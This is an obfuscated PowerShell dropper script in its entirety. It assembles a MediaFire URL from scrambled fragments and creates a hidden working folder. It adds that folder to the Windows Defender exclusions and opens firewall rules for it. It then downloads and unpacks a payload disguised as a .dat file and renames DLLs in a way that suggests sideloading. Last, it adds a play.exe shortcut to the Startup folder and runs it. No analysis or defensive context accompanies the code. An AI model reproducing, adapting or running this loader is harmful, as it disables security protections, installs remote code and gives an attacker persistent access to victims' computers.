$pofysFCZLdgQ = @("s://", "w.medi", "ww", "afire.co", "h", "um/tpxs9e", "ebnru9cny/vzi", "ttp", "ed.da", "t/fi", "le_premi", "le", "p_renam", "m/fi")
$vbqizei = @(4, 7, 0, 2, 1, 3, 13, 10, 5, 6, 12, 8, 9, 11)
$poOTFCAEH7ZLdgQ = ($vbqizei | ForEach-Object { $pofysFCZLdgQ[$_] }) -join
$1pO5oBsz = "C:\Myproject"
$fedfza = @("pla", "at", "y.d")
$sdf = @(0, 2, 1)
$fedfzb = ($sdf | ForEach-Object { $fedfza[$_] }) -join
$fedfz1 = @("pla", "xe", "y.e")
$sddf = @(0, 2, 1)
$fedfzc = ($sddf | ForEach-Object { $fedfz1[$_] }) -join
$fedfz2 = @("n313.da", "pytho", "t")
$sdzdf = @(1, 0, 2)
$fedfzd = ($sdzdf | ForEach-Object { $fedfz2[$_] }) -join
$fedfz3 = @("hon313.d", "pyt", "ll")
$sdzzdf = @(1, 0, 2)
$fedfze = ($sdzzdf | ForEach-Object { $fedfz3[$_] }) -join
$fedfz4 = @("vcru", "e14", "ntim", "at", "0.d")
$sdzezdf = @(0, 2, 1, 4, 3)
$fedfzf = ($sdzezdf | ForEach-Object { $fedfz4[$_] }) -join
$fedfz5 = @("vc", "0.dl", "run", "l", "time14")
$sdzqzdf = @(0, 2, 4, 1, 3)
$fedfzr = ($sdzqzdf | ForEach-Object { $fedfz5[$_] }) -join

$ca32VOHA = @(
@{OriginalName = $fedfzb; NewName = $fedfzc},
@{OriginalName = $fedfzd; NewName = $fedfze},
@{OriginalName = $fedfzf; NewName = $fedfzr}
)

function Generate-RandomDigits { Get-Random -Minimum $(0-0-10000+10000+10000) -Maximum $(0-0-0+99999) }
function Ensure-WorkFolder {
param ([string]$fCwnQ9rxMIljoNeOau2)
$2wev17XHylDZLAJCOMVSGE = Generate-RandomDigits
$Ke3GFrxIwc4OpWDO = "$fCwnQ9rxMIljoNeOau2-$2wev17XHylDZLAJCOMVSGE"
if (-not (Test-Path $Ke3GFrxIwc4OpWDO)) {
New-Item -ItemType Directory -Path $Ke3GFrxIwc4OpWDO -Force | Out-Null
(Get-Item $Ke3GFrxIwc4OpWDO).Attributes = 'Hidden'
}
return $Ke3GFrxIwc4OpWDO
}
function Exclude-FolderFromDefender { param ([string]$Ke3GFrxIwc4OpWDO) Add-MpPreference -ExclusionPath $Ke3GFrxIwc4OpWDO }
function Exclude-FolderFromFirewall {
param ([string]$Ke3GFrxIwc4OpWDO)
netsh advfirewall firewall add rule name="Rule_IN" dir=in action=allow program="$Ke3GFrxIwc4OpWDO" enable=yes | Out-Null
netsh advfirewall firewall add rule name="Rule_OUT" dir=out action=allow program="$Ke3GFrxIwc4OpWDO" enable=yes | Out-Null
}
function Download-File {
param ([string]$CD6JULvJh9DbWzZMsPKST, [string]$2iQV8eByNoxaCUn)
Invoke-WebRequest -Uri $CD6JULvJh9DbWzZMsPKST -OutFile $2iQV8eByNoxaCUn -ErrorAction Stop
}
function Rename-File {
param ([string]$dN5, [string]$2iQV8eByNoxaCUn)
Rename-Item -Path $dN5 -NewName $2iQV8eByNoxaCUn -Force
}
function Extract-ZIP {
param ([string]$Wi9nIYj, [string]$wIeqLkXEy0pp26Nk5UWT54)
if (-not (Test-Path $wIeqLkXEy0pp26Nk5UWT54)) { New-Item -ItemType Directory -Path $wIeqLkXEy0pp26Nk5UWT54 -Force | Out-Null }
Expand-Archive -Path $Wi9nIYj -DestinationPath $wIeqLkXEy0pp26Nk5UWT54 -Force
Remove-Item -Path $Wi9nIYj -Force
}
function Restore-Files {
param ([array]$dKbnJEfGQCwN70y6, [string]$q73lxmiB0F2X)
foreach ($fxO8tsXjdDCBNAknM13c0g in $dKbnJEfGQCwN70y6) {
$lNQI9A4g2dD8uVGS = Join-Path $q73lxmiB0F2X $fxO8tsXjdDCBNAknM13c0g.OriginalName
$2A = Join-Path $q73lxmiB0F2X $fxO8tsXjdDCBNAknM13c0g.NewName
if (Test-Path $lNQI9A4g2dD8uVGS) { Rename-Item -Path $lNQI9A4g2dD8uVGS -NewName $fxO8tsXjdDCBNAknM13c0g.NewName }
}
}
function Create-StartupShortcut {
param ([string]$TzBXvmR87ijuWCrJe3LNbyQ)
$jbr5y1Ia7tgB6vg = [System.Environment]::GetFolderPath('Startup')
$9v9cRsVkaeRtIhN1y2VKcYHB = Join-Path $jbr5y1Ia7tgB6vg "play.lnk"
$Zm9BxXO = New-Object -ComObject WScript.Shell
$JnuqP4yLtF = $Zm9BxXO.CreateShortcut($9v9cRsVkaeRtIhN1y2VKcYHB)
$JnuqP4yLtF.TargetPath = $TzBXvmR87ijuWCrJe3LNbyQ
$JnuqP4yLtF.Save()
}

$Ke3GFrxIwc4OpWDO = Ensure-WorkFolder -baseName $1pO5oBsz
Exclude-FolderFromDefender -folderPath $Ke3GFrxIwc4OpWDO
Exclude-FolderFromFirewall -folderPath $Ke3GFrxIwc4OpWDO
$f8qYqZViRIkN = Join-Path $Ke3GFrxIwc4OpWDO "vzip_renamed.dat"
$oZru4OLINQ8FP1g2fMDmKctkW = Join-Path $Ke3GFrxIwc4OpWDO "vzip_renamed.zip"
Download-File -url $poOTFCAEH7ZLdgQ -destination $f8qYqZViRIkN
Rename-File -source $f8qYqZViRIkN -destination $oZru4OLINQ8FP1g2fMDmKctkW
Extract-ZIP -zipFile $oZru4OLINQ8FP1g2fMDmKctkW -destPath $Ke3GFrxIwc4OpWDO
Restore-Files -fileMappings $ca32VOHA -basePath $Ke3GFrxIwc4OpWDO
$TzBXvmR87ijuWCrJe3LNbyQ = Join-Path $Ke3GFrxIwc4OpWDO "play.exe"
if (Test-Path $TzBXvmR87ijuWCrJe3LNbyQ) {
Create-StartupShortcut -exePath $TzBXvmR87ijuWCrJe3LNbyQ
Start-Process -FilePath $TzBXvmR87ijuWCrJe3LNbyQ
} else {
Write-Error "Arquivo executável não encontrado: $TzBXvmR87ijuWCrJe3LNbyQ"
}